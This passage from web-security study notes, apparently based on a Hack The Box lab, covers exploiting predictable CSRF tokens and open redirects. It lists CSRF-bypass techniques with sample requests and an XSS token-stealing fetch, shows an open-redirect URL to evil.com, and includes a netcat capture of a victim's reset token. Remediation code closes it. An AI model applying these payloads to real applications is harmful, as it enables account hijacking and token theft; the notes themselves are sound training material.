    !function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
    //# sourceMappingURL=md5.min.js.map
    ```
    
    - Save the provided `md5.min.js` script in the same directory as the HTML file.
3. **Serve the Files:**
    - Start a local web server to host the malicious page:
        
        ```bash
        python -m http.server 1337
        
        # access : http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html
        ```
        

---

### **4. Simulate the Victim**

1. **Login as the Victim:**
2. **Access the Malicious Page:**
    - Open a new tab and navigate to the attacker-controlled URL:
        
        ```
        http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html
        ```
        
3. **Trigger the Exploit:**
    - Click the "Start!" button on the malicious page.
    - The victim's profile visibility will be changed (made public) without their consent.

---

### **Exploit Validation**

1. **Verify the Profile Visibility:**
    - Refresh the victim's profile page.
    - Observe that the profile is now public, indicating a successful CSRF attack.

---

### **Conclusion**

This example highlights the risks of predictable CSRF token generation and demonstrates how attackers can exploit such weaknesses. By adopting secure token generation practices and robust CSRF defenses, web applications can significantly reduce the risk of such attacks.

# **Additional CSRF Protection Bypass Techniques**

When conducting penetration tests or bug bounty hunting, understanding the nuances of CSRF protections and potential bypass techniques is critical. Here are various approaches to bypass CSRF protections, explained with examples and use cases:

---

### **1. Null Value**

- **Description:**
Some applications only check for the presence of the `CSRF-Token` header but do not validate its value. This allows bypassing by sending an empty value.

---

### **2. Random CSRF Token**

- **Description:**
If the application validates only the token's length and not its value, you can provide a random token of the same length.
    - For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.
- **Example:**
Real: CSRF-Token: **`9cfffd9e8e78bd68975e295d1b3d3331`**
    
    Fake: CSRF-Token: **`9cfffl3dj3837dfkj3j387fjcxmfjfd3`**
    

---

### **3. Use Another Session’s CSRF Token**

Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.

- **Steps:**
    1. Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`
    2. Log into Account B and change the CSRF-token to ****`CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331` while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks

---

### **4. Request Method Tampering**

- **Description:**
Some applications only enforce CSRF protections on specific HTTP methods (e.g., POST). Changing the request method can bypass the protection.
- **Example:**
If the APP is using **`POST`**, try changing to **`GET`**:
    
    ```
    POST /change_password
    POST body:
    new_password=pwned&confirm_new=pwned
    ```
    
    ```
    GET /change_password?new_password=qwerty&confirm_new=qwerty
    ```
    
    Unexpected requests may be served without the need for a CSRF token.
    

---

### **5. Delete the CSRF Token Parameter or Send a Blank Token**

- **Description:**
If the application does not strictly enforce token validation, removing the CSRF token parameter or sending it blank may work.
- Real Request:
    
    ```php
    POST /change_password
    POST body:
    new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
    ```
    
    Blank CSRF token:
    
    ```php
    POST /change_password
    POST body:
    new_password=qwerty
    ```
    
    Or:
    
    ```php
    POST /change_password
    POST body:
    new_password=qwerty&csrf_token=
    ```
    

---

### **6. Session Fixation with CSRF**

- **Description:**
Applications using a double-submit cookie for CSRF protection may only compare the cookie value with the request parameter value without verifying their legitimacy. 

This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.

If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.
- **Steps:**
    1. Session fixation
    2. Execute CSRF with the following request:
        
        ```
        POST /change_password
        Cookie: CSRF-Token=fixed_token;
        POST body:
        new_password=pwned&CSRF-Token=fixed_token
        ```
        

---

### **7. Anti-CSRF Protection via the Referrer Header**

- **Bypass 1: Remove Referrer Header**
    - Use the `<meta>` tag to remove the `Referrer` header:
        
        ```html
        <meta name="referrer" content="no-referrer">
        ```
        

### **8. Exploit Weak Regex**

Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain.

- If the application checks for `google.com` in the referrer, you can manipulate the URL to bypass:
    
    ```
    www.google.com.pwned.example
    ```
    
- For a target domain `www.target.com`:
    
    ```
    www.pwned.example?www.target.com
    ```
    

---

### **8. CSRF Token Length-Based Validations**

- **Description:**
If the application validates only the length of the token, craft a token of the same length with random values.
- **Example:**
Valid Token :CSRF-Token: **`abc1234567890defghijklmnopqrstuv`**
    
    Fake Token: CSRF-Token: **`xyz0987654321uvwxyzabcdefghijkl`**
    

---

### **9. Request Timing and Parallelism**

- Applications that generate tokens dynamically but allow simultaneous requests may allow exploitation by sending multiple requests in parallel. The CSRF token for the next request may still be valid.

---

### **10. Bypass via XSS**

- If the application has an XSS vulnerability, you can use JavaScript to fetch a valid CSRF token from the application and include it in your malicious request.
- **Example:**
    
    ```jsx
    fetch('/get-csrf-token')
      .then(response => response.text())
      .then(token => {
        fetch('/update-profile', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `csrf_token=${token}&new_email=pwned@example.com`
        });
      });
    ```
    

---

# **Open Redirect**

An **Open Redirect** vulnerability allows attackers to redirect users to malicious or attacker-controlled URLs by abusing the redirection functionality of legitimate web applications. Below, we will explore how this vulnerability works, how attackers exploit it, and its implications, with a step-by-step example and preventive measures.

---

### **How Open Redirect Works**

The vulnerability typically arises when:

1. A web application redirects users to a URL specified in a user-controlled parameter (e.g., `redirect_uri` or `url`).
2. The application does not validate or restrict the target URL.

**Example Code:**

```php
$red = $_GET['url'];
header("Location: " . $red);
```

**Explanation:**

1. The `$_GET['url']` retrieves the value of the `url` parameter from the request.
2. The `header("Location: " . $red)` redirects the user to the specified value of `$red`, without any validation.

**Attack URL Example:**

```
http://trusted.site/index.php?url=https://evil.com
```

When a victim clicks this link, they are redirected to `https://evil.com`.

---

### **Common Parameters to Check for Open Redirect Vulnerabilities**

When hunting for Open Redirect vulnerabilities, focus on parameters like:

- **`?url=`**
- **`?link=`**
- **`?redirect=`**
- **`?redirecturl=`**
- **`?redirect_uri=`**
- **`?return=`**
- **`?return_to=`**
- **`?returnurl=`**
- **`?go=`**
- **`?goto=`**
- **`?exit=`**
- **`?exitpage=`**
- **`?fromurl=`**
- **`?fromuri=`**
- **`?redirect_to=`**
- **`?next=`**
- **`?newurl=`**
- **`?redir=`**

These are often found in login, logout, or page navigation functionalities.

---

### **Practical Example: Exploiting Open Redirect**

### **1. Application Setup**

- Navigate to `http://oredirect.htb.net`.
- You will see a URL similar to:
    
    ```
    http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>
    ```
    
- Entering an email account sends a POST request to the `redirect_uri` parameter, with a token included.

![image.png](image%20164.png)

---

### **2. Setting Up an Attacker Listener**

- Start a Netcat listener to capture connections: **`nc -lvnp 1337`**

### **3. Crafting a Malicious URL**

- Copy the original URL:
    
    ```bash
    http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN>
    #
    http://oredirect.htb.net/?redirect_uri=/complete.html&token=dmuanigk866941v12m0f3tdk2t
    ```
    
- Modify the `redirect_uri` parameter to point to your malicious server:
    
    ```bash
    http://oredirect.htb.net/?redirect_uri=http://<YOUR_IP>:1337&token=<RANDOM TOKEN>
    ```
    

---

### **4. Simulating the Victim**

- Open a New Private Window and navigate to the crafted URL.
- Enter an email in the form.

### **5. Capturing the Redirect**

- The victim’s browser will send a request to your malicious server (captured by Netcat).
- The request will include sensitive data like the token.

**Example Netcat Output:**

```bash
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.130] from (UNKNOWN) [10.10.15.130] 56214
POST / HTTP/1.1
Host: 10.10.15.130:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Origin: http://oredirect.htb.net
DNT: 1
Connection: keep-alive
Referer: http://oredirect.htb.net/
Upgrade-Insecure-Requests: 1

email=test%40hacker.com&recover-submit=Reset+Password&token=ruekvsi9gpll08dp3i6iuhdij2
```

---

### **Exploitation Implications**

1. **Phishing Attacks:**
    - Attackers craft legitimate-looking URLs using the trusted domain to lure users into clicking them.
    - Victims are redirected to attacker-controlled pages, leading to credential theft or malware delivery.
2. **Token Stealing:**
    - If the redirection URL includes sensitive information (like session tokens or anti-CSRF tokens), attackers can capture them, leading to session hijacking or other exploits.

---

### **Preventive Measures for Open Redirect Vulnerabilities**

### **1. Validate and Whitelist URLs**

- Restrict redirection targets to a predefined list of trusted URLs:
    
    ```php
    $whitelist = [
        "/complete.html",
        "/dashboard.html",
    ];
    if (!in_array($_GET['url'], $whitelist)) {
        die("Invalid redirect URL");
    }
    ```
    

### **2. Use Relative URLs**

- Avoid allowing absolute URLs in redirection parameters:
    
    ```php
    if (strpos($_GET['url'], "http") !== false) {
        die("Invalid redirect URL");
    }
    ```
    

### **3. Sanitize and Encode Input**

- Ensure user input is sanitized and encoded to prevent injection:
    
    ```php
    $red = htmlspecialchars($_GET['url']);
    ```
    

### **4. Secure Tokens**

- Do not include sensitive tokens (like session or anti-CSRF tokens) in the redirection URLs.

### **5. Implement User Confirmation**

- Before performing the redirection, prompt the user to confirm the target URL.

### **6. Monitor and Audit**

- Regularly test and audit redirection endpoints for vulnerabilities.

---

### **Conclusion**

Open Redirect vulnerabilities, while often overlooked, can have severe security implications. By validating and restricting redirect targets, applications can mitigate the risks associated with these vulnerabilities. During penetration tests or bug bounty hunting, always test redirection parameters rigorously to identify potential exploits.

# [**Remediation Advice**](https://academy.hackthebox.com/module/153/section/1454)